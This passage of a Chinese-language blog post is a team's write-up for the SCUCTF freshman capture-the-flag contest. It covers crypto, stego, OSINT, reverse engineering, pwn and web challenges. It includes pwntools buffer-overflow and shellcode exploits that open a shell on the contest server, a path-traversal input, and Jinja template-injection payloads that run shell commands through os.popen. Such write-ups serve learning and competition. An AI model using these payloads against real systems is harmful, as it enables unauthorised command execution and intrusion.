class="built_in">hex</span>(m)[<span class="number">2</span>:].decode(<span class="string">&#x27;hex&#x27;</span>))</span><br></pre></td></tr></table></figure>
+<h2 id="Crypto-5-strange-RSA"><a href="#Crypto-5-strange-RSA" class="headerlink" title="Crypto-5:strange_RSA"></a>Crypto-5:strange_RSA</h2><p>n可以用factordb直接分解。</p>
+<p>至于e与φ(n)不互素的问题，可以使用中国剩余定理求解，具体参考以下链接。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/十次方根/README.md">https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E5%8D%81%E6%AC%A1%E6%96%B9%E6%A0%B9/README.md</a></p>
+<p><img src="/2021/11/23/ctf04/crypto5.png"></p>
+<h2 id="Crypto-7-Elliptic-Curve"><a href="#Crypto-7-Elliptic-Curve" class="headerlink" title="Crypto-7:Elliptic Curve"></a>Crypto-7:Elliptic Curve</h2><p>椭圆曲线的入门题，与攻防世界的easy ECC相比，缺少了a,b两个参数。但是，有三个已知点，我们可以通过椭圆曲线的方程解出这两个未知数。</p>
+<p><img src="/2021/11/23/ctf04/crypto7.png"></p>
+<p>注意这两个值要在模p的情况下有意义，我们可以用gmpy2.invert函数求出对应的值。</p>
+<p>最后根据快速幂，我们可以写出以下代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">zero = (<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a = <span class="number">82434704921831126317349084148380426791883173943813663537990423892369888514044</span></span><br><span class="line">b = <span class="number">311475221040936280208362290787407966613</span></span><br><span class="line">n = <span class="number">82434704921831126317349084148380426792000286866075383521515099269291038312183</span></span><br><span class="line">p = <span class="number">82434704921831126317349084148380426791883173943813663537990423892369888514061</span></span><br><span class="line">G = (<span class="number">81403639825184272992871756462679165959131935479082301407409473940853140527035</span> , <span class="number">111858327599117205208040416341606595974639126132558018462114484339055815343</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">p1, p2</span>):</span><br><span class="line">  <span class="keyword">if</span> p1 == zero:</span><br><span class="line">     <span class="keyword">return</span> p2</span><br><span class="line">  <span class="keyword">if</span> p2 == zero:</span><br><span class="line">     <span class="keyword">return</span> p1</span><br><span class="line">  (p1x,p1y),(p2x,p2y) = p1,p2</span><br><span class="line">  <span class="keyword">if</span> p1x == p2x <span class="keyword">and</span> (p1y != p2y <span class="keyword">or</span> p1y == <span class="number">0</span>):</span><br><span class="line">     <span class="keyword">return</span> zero</span><br><span class="line">  <span class="keyword">if</span> p1x == p2x:</span><br><span class="line">     lam = (<span class="number">3</span> * p1x * p1x + a) * invert(<span class="number">2</span> * p1y , p) % p</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">     lam = (p2y - p1y) * invert(p2x - p1x , p) % p</span><br><span class="line">  x = (lam**<span class="number">2</span> - p1x - p2x) % p</span><br><span class="line">  y = (lam * (p1x - x) - p1y) % p</span><br><span class="line">  <span class="keyword">return</span> (<span class="built_in">int</span>(x),<span class="built_in">int</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">point_neg</span>(<span class="params">point</span>):</span><br><span class="line">  x, y = point</span><br><span class="line">  res = (x, -y % p)</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fast_mul</span>(<span class="params">k, point</span>):</span><br><span class="line">  <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  a trick!</span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">if</span> k &lt; <span class="number">0</span>:</span><br><span class="line">     <span class="keyword">return</span> fast_mul(-k, point_neg(point))</span><br><span class="line">  res = zero</span><br><span class="line">  addend = point</span><br><span class="line">  <span class="keyword">while</span> k:</span><br><span class="line">     <span class="keyword">if</span> k &amp; <span class="number">1</span>:</span><br><span class="line">       res = add(res, addend)</span><br><span class="line">     addend = add(addend, addend)</span><br><span class="line">     k &gt;&gt;= <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">  </span><br><span class="line">k = <span class="number">73844933862216652622492520515324611426018473790347046447404478062546746765750</span></span><br><span class="line"></span><br><span class="line">C1 = (<span class="number">20058089234486140225873266550951624285964438180038043783132571119098797258964</span> , <span class="number">44425976028240060721292567543561982553652201677216540575424866418518533833686</span> )</span><br><span class="line"></span><br><span class="line">C2 = (<span class="number">44219316884405871793950087163675141641324021196457542671365362829884688420072</span> , <span class="number">42705405459815954011526630723538719826904473252385988608867562886364716986612</span> )</span><br><span class="line"></span><br><span class="line">nC2 = fast_mul(k, C2)</span><br><span class="line">m = add(C1,point_neg(nC2))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m[<span class="number">0</span>] + m[<span class="number">1</span>])[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>
+<h2 id="Crypto-8-Vigenere"><a href="#Crypto-8-Vigenere" class="headerlink" title="Crypto-8:Vigenere"></a>Crypto-8:Vigenere</h2><p><a target="_blank" rel="noopener" href="https://quipquip.com">quipquip.com</a></p>
+<p>这种大段的文字，进行词频分析很容易解决。</p>
+<p><img src="/2021/11/23/ctf04/crypto8.png"></p>
+<h2 id="Misc-1-test-your-nc"><a href="#Misc-1-test-your-nc" class="headerlink" title="Misc-1:test_your_nc~~~"></a>Misc-1:test_your_nc~~~</h2><p>图片的尺寸太大，kali的终端有缩小文字的功能。</p>
+<h2 id="Misc-2-OldKinderhoek"><a href="#Misc-2-OldKinderhoek" class="headerlink" title="Misc-2:OldKinderhoek"></a>Misc-2:OldKinderhoek</h2><p>文件名叫Ook.txt，上网查询Ook编码，发现只有3种编码方式（恰好文本也只有0、1、4三个数），写个脚本排列组合一下，排版处理好，就可以拿到网站去解密了。</p>
+<p><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p>
+<h2 id="Misc-3-test-your-nc"><a href="#Misc-3-test-your-nc" class="headerlink" title="Misc-3:test_your_nc~~~~~~~~~"></a>Misc-3:test_your_nc~~~~~~~~~</h2><p>作画比赛，通过可见字符填充像素，输入cat /f*命令即可。</p>
+<p>（orc识别精度真的低，有时候同一个字符画有时能识别，有时不能识别）</p>
+<h2 id="Misc-4-Time-To-Leave"><a href="#Misc-4-Time-To-Leave" class="headerlink" title="Misc-4:Time To Leave"></a>Misc-4:Time To Leave</h2><p>流量题，将ttl字段添加到列上。按照时间顺序，只看ttl所对应的字节码，就可以看到每隔几个字符出现的flag。</p>
+<h2 id="Misc-5-Fire-in-the-hole"><a href="#Misc-5-Fire-in-the-hole" class="headerlink" title="Misc-5:Fire in the hole"></a>Misc-5:Fire in the hole</h2><p>010-editor打开压缩文件</p>
+<p><img src="/2021/11/23/ctf04/misc5_1.png"></p>
+<p>根据提示（文件夹也是一种文件），我们文件夹的形式改成文件的形式：</p>
+<p><img src="/2021/11/23/ctf04/misc5.png"></p>
+<p>把第一排的flag/改成flag即可</p>
+<p>scuctf{d1r_0r_fffffil3?}</p>
+<h2 id="Misc-6-Puny先辈的咆哮"><a href="#Misc-6-Puny先辈的咆哮" class="headerlink" title="Misc-6:Puny先辈的咆哮"></a>Misc-6:Puny先辈的咆哮</h2><p>题目提示很明显，先用punycode解码，然后会得到一串不可描述的文字。复制一段文字在网上搜就可以搜到解码这段文字的网站。</p>
+<p><a target="_blank" rel="noopener" href="https://roar.iiilab.com/">https://roar.iiilab.com/</a></p>
+<h2 id="Stego-1-EZ-Steg"><a href="#Stego-1-EZ-Steg" class="headerlink" title="Stego-1:EZ_Steg"></a>Stego-1:EZ_Steg</h2><p>Stegsolve打开，左右翻几下，二维码就出来了，扫一下就是flag。</p>
+<h2 id="Stego-2-Baby-Steg"><a href="#Stego-2-Baby-Steg" class="headerlink" title="Stego-2:Baby_Steg"></a>Stego-2:Baby_Steg</h2><p>那个提示就很劝退，看不懂，“秘密信息比特”机翻味儿十足。</p>
+<p>Stegsolve在调整到random color map的时候，细心的同学会发现左上角有串不规则的像素点，类似于这样：</p>
+<p><img src="/2021/11/23/ctf04/stego2.png"></p>
+<p>把像素点进行01编码，转成ascii，就可以得到flag。虽然中间有颜色的那段看不清楚，但是flag是有意义的，可以猜得到（我一次就猜中了）。</p>
+<h2 id="Web-vscodeServer"><a href="#Web-vscodeServer" class="headerlink" title="Web:vscodeServer"></a>Web:vscodeServer</h2><p>既然是简单题，而且界面那么现代，那么肯定不涉及注入之类的漏洞。</p>
+<p>直接一输弱口令，就进去了，还是个root。</p>
+<p>找到终端，ls，cat flag，完工。</p>
+<h2 id="Web-6-include"><a href="#Web-6-include" class="headerlink" title="Web-6:include"></a>Web-6:include</h2><p>最最最基础的文件包含，连我这个不碰web的人都写出来了。</p>
+<p>?file=../../../flag</p>
+<p>scuctf{1nclude_Y0u_g0t_1t}</p>
+<h2 id="Java-命令执行"><a href="#Java-命令执行" class="headerlink" title="Java:命令执行"></a>Java:命令执行</h2><p>出题人撤回的手速不够快，还是被我下载到了。</p>
+<p><img src="/2021/11/23/ctf04/java.jpg"></p>
+<h2 id="Osint-3-寂寞的夜"><a href="#Osint-3-寂寞的夜" class="headerlink" title="Osint-3:寂寞的夜"></a>Osint-3:寂寞的夜</h2><p>可以从图片看到有一家店叫“速8超市”，使用百度地图，可以找到为数不多的的几个地方，其中一个位于北京的街景图跟这张比较像，就成了。</p>
+<h2 id="Pwn-1-test-your-nc"><a href="#Pwn-1-test-your-nc" class="headerlink" title="Pwn-1:test_your_nc"></a>Pwn-1:test_your_nc</h2><p>同buuctf pwn第一题，直接nc连接，cat flag即可。</p>
+<h2 id="Pwn-2-quiz"><a href="#Pwn-2-quiz" class="headerlink" title="Pwn-2:quiz"></a>Pwn-2:quiz</h2><p>前面三道题你会C语言就会做。</p>
+<p>汇编基础还是得学的，毕竟代码放到asm文件并不能直接运行，甚至还没你肉眼观察来得快。</p>
+<p>学习链接：<a target="_blank" rel="noopener" href="https://www.icourse163.org/course/ZZU-1001796025">https://www.icourse163.org/course/ZZU-1001796025</a></p>
+<h2 id="Pwn-3-stackoverflow"><a href="#Pwn-3-stackoverflow" class="headerlink" title="Pwn-3:stackoverflow"></a>Pwn-3:stackoverflow</h2><p>pwn最简单的类型，只需要找到bufferlength和后门地址就可以了。</p>
+<p>Vuln_echo函数中buf的长度为0x30，因为是64位，加上rbp的长度8，就是填充的长度。</p>
+<p>返回地址就是backdoor函数中system(“bin/sh”)函数的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&#x27;/ret2text&#x27;)</span></span><br><span class="line">io = connect(<span class="string">&#x27;game.scuctf.com&#x27;</span>, <span class="number">20006</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0x4012D7</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Pwn-4-ret2shellcode"><a href="#Pwn-4-ret2shellcode" class="headerlink" title="Pwn-4:ret2shellcode"></a>Pwn-4:ret2shellcode</h2><p>64位程序，elf文件</p>
+<p>可以使用不断io.recvline()来读取每一行的信息，再进行切片就可以截取到输入地址。</p>
+<p>从某些方面来说，输入地址与泄露地址之间存在一定的偏移（可以通过动态调试查看rsi的地址与题目给出的地址差来确定），但本题偏移为0.</p>
+<p>Payload=shellcode.ljust(k,’a’)+p64(buf)</p>
+<p>k=bias+bufferlength+sizeof(ebp)</p>
+<p>因此填充k的数量为0x88</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)<span class="comment">#不加这行会出现sigill错误</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2shellcode&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;game.scuctf.com&#x27;</span>,<span class="number">20004</span>)</span><br><span class="line">loc = p.recvline()</span><br><span class="line">loc = p.recvline()</span><br><span class="line">loc = p.recvline()</span><br><span class="line">loc = p.recvline()</span><br><span class="line">loc = p.recvline()</span><br><span class="line">loc = p.recvline()</span><br><span class="line">buf = <span class="built_in">int</span>(loc[-<span class="number">15</span>:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x88</span>, <span class="string">b&#x27;a&#x27;</span>) + p64(buf)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>（Re最简单的题和最难的题都被队员抢了qwq）</p>
+<h2 id="Re5-ezapk"><a href="#Re5-ezapk" class="headerlink" title="Re5:ezapk"></a>Re5:ezapk</h2><p>（一点也不easy，光看jeb还不能解决问题。）</p>
+<p>Mainactivity中有一个private成员，名曰check函数，在代码段中没有定义。</p>
+<p>根据以往做题的经验，我马上用ida加载apk的库文件，找到了check函数。</p>
+<p>（这代码看着真头疼，尤其是那个return）</p>
+<p><img src="/2021/11/23/ctf04/re5.png"></p>
+<p>个人猜测源码的含义是将输入的前半放到奇数位，后半放到偶数位，并将每一项与它的位置异或，与内部的密文进行对比。</p>
+<p>我编写了解密脚本，但是flag部分字符出了点锅。于是我就只将每一位异或，肉眼观察出答案了。</p>
+<h2 id="HappyRe-ezJava"><a href="#HappyRe-ezJava" class="headerlink" title="HappyRe:ezJava"></a>HappyRe:ezJava</h2><p>（确实很happy）</p>
+<p>Jeb4.2打开，反编译一下，往下翻直接看到flag。</p>
+<p><img src="/2021/11/23/ctf04/happyre.png"></p>
+<h2 id="Re4-Upxed"><a href="#Re4-Upxed" class="headerlink" title="Re4:Upxed"></a>Re4:Upxed</h2><p>虽然出题人希望我们手动脱壳，但是upx脱壳的结果也具有可读性，还是挺不错的。</p>
+<p>提示说这是tea加密，这里有一个手写的C代码：</p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-266933.htm">https://bbs.pediy.com/thread-266933.htm</a></p>
+<p>我们查看反汇编：</p>
+<p><img src="/2021/11/23/ctf04/re4.png"></p>
+<p>密文就是那个v6数组，key就是THIS_IS_THE_KEYa，注意转换成int的时候要使用小端序。</p>
+<p>然后还要注意加密循环次数（32次），一个magic number（-0x61C88647，注意，是“负数“，这点比较坑）。其余的照葫芦画瓢即可。</p>
+<h2 id="Re9-Plants-Vs-Zombies（非预期解）"><a href="#Re9-Plants-Vs-Zombies（非预期解）" class="headerlink" title="Re9:Plants_Vs_Zombies（非预期解）"></a>Re9:Plants_Vs_Zombies（非预期解）</h2><p> <strong>（正解是与“天堂之门”有关的技术，当然我现在肯定不会。）</strong></p>
+<p>拿到游戏我先使用一些奇技淫巧，在半个小时以内的时间通关了（不要问我如何快速通关的），然而期望中的解密程序并没有出现。</p>
+<p>然后在游戏失败时，根目录里面的flag.txt会被加密成flag.enc。我由于前面两道题都做了密码学，crypto杀疯了，我便尝试去寻找明文与密文的关系。</p>
+<p><img src="/2021/11/23/ctf04/re9.png"></p>
+<p>由图可知，明文和密文是按位加密，而且两者之间的换算有很明显的线性关系，只是加了数组中的地址，解密时只需在程序中减去地址即可。</p>
+<p>（其中第七个字节有点特别，但是我们知道它肯定是“{“，因此我们暂且不去管它）</p>
+<p>现在我们来确定k，b与mod这几个参数。</p>
+<p>算k很容易，做差就可以，答案是0x20</p>
+<p>算b的时候出了一点小锅，当我把ascii码为0的字符输进去时，程序会崩溃，经过与出题人的交流后得知是技术导致的锅。于是我把ascii为1输进去，得到结果0x20，因此b=0.</p>
+<p>至于算mod,见下图：</p>
+<p><img src="/2021/11/23/ctf04/re9_2.png"></p>
+<p>很明显mod&lt;=256，而且出现了“FB“这个字符，因此mod&gt;251，因此mod只有255这个唯一值。</p>
+<p>做到这里程序的加密函数已经被我完全理清了，接下来有两个办法：</p>
+<ol>
+<li><p>写解密函数。</p>
+</li>
+<li><p>直接将原文和密文映射，用数组保存。</p>
+</li>
+</ol>
+<p>我选择了后者，因为32与255互质，因此理论上能够一一映射，但是在实战中还是出现了一些问题——打印出的flag有些字符无法显示。</p>
+<p><img src="/2021/11/23/ctf04/re9_1.png"></p>
+<p>那两个空的地方，左边应该是一个下划线，右边我尝试了一下fate，gate这两个单词，结果就出来了。</p>
+<p>参考代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> enc[]=&#123;</span><br><span class="line"><span class="number">0x6E</span>, <span class="number">0x6D</span>, <span class="number">0xB0</span>, <span class="number">0x6F</span>, <span class="number">0x92</span>, <span class="number">0xD1</span>, <span class="number">0x11</span>, <span class="number">0x74</span>, <span class="number">0xD5</span>, <span class="number">0xF6</span>, <span class="number">0x76</span>, <span class="number">0x78</span>, <span class="number">0x39</span>, <span class="number">0xDA</span>, <span class="number">0xF9</span>, <span class="number">0xFC</span>,</span><br><span class="line"><span class="number">0xDD</span>, <span class="number">0xFC</span>, <span class="number">0x1F</span>, <span class="number">0xBF</span>, <span class="number">0x40</span>, <span class="number">0xE3</span>, <span class="number">0xC2</span>, <span class="number">0xE4</span>, <span class="number">0x86</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0x47</span>, <span class="number">0xAA</span>, <span class="number">0xC9</span>, <span class="number">0xCD</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">encr</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> pos)</span>&#123;</span><br><span class="line">	<span class="type">int</span> k=<span class="number">0x20</span>;</span><br><span class="line">	<span class="type">int</span> mod=<span class="number">255</span>;</span><br><span class="line">	<span class="keyword">return</span> (k*x+pos)%mod;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> inv[<span class="number">300</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">127</span>;i++)</span><br><span class="line">		inv[encr(i,<span class="number">0</span>)]=i;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,inv[enc[i]-i]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="WriteUp-from-xiran"><a href="#WriteUp-from-xiran" class="headerlink" title="WriteUp from xiran"></a>WriteUp from xiran</h1><h2 id="Osint-1：该走哪条路"><a href="#Osint-1：该走哪条路" class="headerlink" title="Osint-1：该走哪条路"></a>Osint-1：该走哪条路</h2><p>观察图片：成都中新</p>
+<p>在地图搜索，得到flag</p>
+<h2 id="Osint-2：赶火车"><a href="#Osint-2：赶火车" class="headerlink" title="Osint-2：赶火车"></a>Osint-2：赶火车</h2><p>把图片放入百度识图就找到原图</p>
+<p>查看图片介绍找到flag</p>
+<p><img src="/2021/11/23/ctf04/osint2.png"></p>
+<h2 id="Osint-4：蓝色星球"><a href="#Osint-4：蓝色星球" class="headerlink" title="Osint-4：蓝色星球"></a>Osint-4：蓝色星球</h2><p>在百度筛选卫星图，获得</p>
+<p><img src="/2021/11/23/ctf04/osint2_1.png"></p>
+<p>一眼看出是意大利</p>
+<p><img src="/2021/11/23/ctf04/osint2_2.png"></p>
+<p>获得答案</p>
+<h2 id="Osint-5：旅行日记"><a href="#Osint-5：旅行日记" class="headerlink" title="Osint-5：旅行日记"></a>Osint-5：旅行日记</h2><p>通过告示牌定位到日本大津</p>
+<p>查看大津的JR车站名字，找到和告示牌相像的</p>
+<p>查看指路牌获得方向</p>
+<p>利用谷歌地图获得答案</p>
+<h2 id="RE1-Welcome"><a href="#RE1-Welcome" class="headerlink" title="RE1:Welcome"></a>RE1:Welcome</h2><p>IDA载入，获得一串数字</p>
+<p>输入到程序得到FLAG</p>
+<h2 id="RE2-Xor"><a href="#RE2-Xor" class="headerlink" title="RE2:Xor"></a>RE2:Xor</h2><p>IDA载入，得到是简单异或</p>
+<p>查看内存，反异或得到答案</p>
+<h2 id="RE3-DebugMe"><a href="#RE3-DebugMe" class="headerlink" title="RE3:DebugMe"></a>RE3:DebugMe</h2><p>IDA远程调试</p>
+<p>找到程序的正确终点，通过调整寄存器让程序跑到正确位置，拿到flag</p>
+<h2 id="RE6-EzLinearEquation"><a href="#RE6-EzLinearEquation" class="headerlink" title="RE6:EzLinearEquation"></a>RE6:EzLinearEquation</h2><p>IDA载入，得到多元1次方程，调用python的z3库解方程即可</p>
+<p><a target="_blank" rel="noopener" href="https://netcut.cn/1fl6ahg7f">Re6.cpp</a>（一周内有效）</p>
+<h2 id="RE7-VirtualMachine"><a href="#RE7-VirtualMachine" class="headerlink" title="RE7:VirtualMachine"></a>RE7:VirtualMachine</h2><p>x32dbg载入</p>
+<p>输入函数</p>
+<p><img src="/2021/11/23/ctf04/re7.png"></p>
+<p>比较函数</p>
+<p><img src="/2021/11/23/ctf04/re7_1.png"></p>
+<p>比较函数首先比较字符串长度</p>
+<p>然后对加密后的输入和密文比较</p>
+<p>通过实验发现是单个字符依次加密</p>
+<p>爆破flag进行验证即可</p>
+<h2 id="HardRe-Fxxk"><a href="#HardRe-Fxxk" class="headerlink" title="HardRe:Fxxk"></a>HardRe:Fxxk</h2><p>Od载入</p>
+<p>单步执行到主函数</p>
+<p><img src="/2021/11/23/ctf04/re8.png"></p>
+<p>输入函数</p>
+<p><img src="/2021/11/23/ctf04/re8_1.png"></p>
+<p>得知字符串的长度为8</p>
+<p><img src="/2021/11/23/ctf04/re8_2.png"></p>
+<p>验证字符串的长度是否为8</p>
+<p><img src="/2021/11/23/ctf04/re8_3.png"></p>
+<p>对每一个字符通过这个函数验证</p>
+<p>进入这个函数</p>
+<p><img src="/2021/11/23/ctf04/re8_4.png"></p>
+<p>分析此函数得 验证输入是否在A-Z范围内</p>
+<p>顺便加密输入</p>
+<p>观察寄存器得到加密后的输入</p>
+<p><img src="/2021/11/23/ctf04/re8_5.png"></p>
+<p>继续执行，发现一个字符串</p>
+<p><img src="/2021/11/23/ctf04/re8_6.png"></p>
+<p>继续执行代码，发现是把加密后的输入挨个与 “LMSULHNH“比较</p>
+<p>方法1：爆破flag</p>
+<p>方法2：根据汇编的加密函数反推flag</p>
+<h1 id="WriteUp-from-Cyan"><a href="#WriteUp-from-Cyan" class="headerlink" title="WriteUp from Cyan"></a>WriteUp from Cyan</h1><h2 id="Web1-Get-amp-Post"><a href="#Web1-Get-amp-Post" class="headerlink" title="[Web1] Get&amp;Post"></a>[Web1] Get&amp;Post</h2><p><img src="/2021/11/23/ctf04/web1.png"></p>
+<p>Post flag=flagggg</p>
+<p>Get a=flag</p>
+<h2 id="Web2-Hardphp"><a href="#Web2-Hardphp" class="headerlink" title="[Web2] Hardphp"></a>[Web2] Hardphp</h2><p>纪律性检查robots.txt后访问indexxxxx.php</p>
+<p>找到源码</p>
+<p><img src="/2021/11/23/ctf04/web2.png"> </p>
+<p>构造0e开头且md5值0e开头的字符串0e215962017</p>
+<p><img src="/2021/11/23/ctf04/web2_1.png"> </p>
+<h2 id="Web5-抽象的代码艺术"><a href="#Web5-抽象的代码艺术" class="headerlink" title="[Web5]抽象的代码艺术"></a>[Web5]抽象的代码艺术</h2><p>将源码url编码后</p>
+<p><img src="/2021/11/23/ctf04/web5.png"> </p>
+<p>发现多了</p>
+<blockquote>
+<p>%80%AE%E2%81%A6  %80%AE%E2%80%A6</p>
+</blockquote>
+<p>这两种不可见字符，构造</p>
+<blockquote>
+<p>%E2%80%AE%E2%81%A6scuctf%E2%80%AE…666=scuctf</p>
+</blockquote>
+<p><img src="/2021/11/23/ctf04/web5_1.png"> </p>
+<h2 id="Web7-curl-curl-curl"><a href="#Web7-curl-curl-curl" class="headerlink" title="[Web7] curl_curl_curl"></a>[Web7] curl_curl_curl</h2><p>由题目易得存在curl的漏洞</p>
+<p>测试一下</p>
+<p><img src="/2021/11/23/ctf04/web7.png"></p>
+<p>发现ls命令被执行了</p>
+<p>然后就是简单的翻找目录然后双写绕过cat flag</p>
+<p><img src="/2021/11/23/ctf04/web7_1.png"> </p>
+<h2 id="Web-ezSSTI"><a href="#Web-ezSSTI" class="headerlink" title="[Web]ezSSTI"></a>[Web]ezSSTI</h2><p>由题目易得存在sstl标准注入的漏洞</p>
+<p>测试一下</p>
+<p><img src="/2021/11/23/ctf04/ssti.png"></p>
+<p>发现命令被执行</p>
+<p>获取所有类</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?name=</span><span class="template-variable">&#123;&#123;%<span class="name">27</span>%<span class="number">27</span>.__class__.__mro__[2].__subclasses__()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/23/ctf04/ssti_1.png"> </p>
+<p>寻找<class ‘warnings.catch_warnings’>为第59位</class></p>
+<p>构造执行命令的payload</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?name=</span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[59].__init__.__globals__[%27__builtins__%27][%27__imp%27+%27ort__%27](%<span class="name">27os</span>%<span class="number">27</span>).__dict__[%27pop%27+%27en%27](%<span class="name">27ls</span>%<span class="number">20</span>/%<span class="number">27</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/23/ctf04/ssti_2.png"> </p>
+<p>被执行但没发现flag文件</p>
+<p>在提示下查看环境变量</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?name=</span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[59].__init__.__globals__[%27__builtins__%27][%27__imp%27+%27ort__%27](%<span class="name">27os</span>%<span class="number">27</span>).__dict__[%27pop%27+%27en%27](%<span class="name">27env</span>%<span class="number">27</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/23/ctf04/ssti_3.png"> </p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>原作者： </strong>junyu33
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://junyu33.me/2021/11/23/ctf04.html" title="scuctf新生赛——幽篁终见天战队wp">https://junyu33.me/2021/11/23/ctf04.html</a>
+  </li>
+  <li class="post-copyright-license">
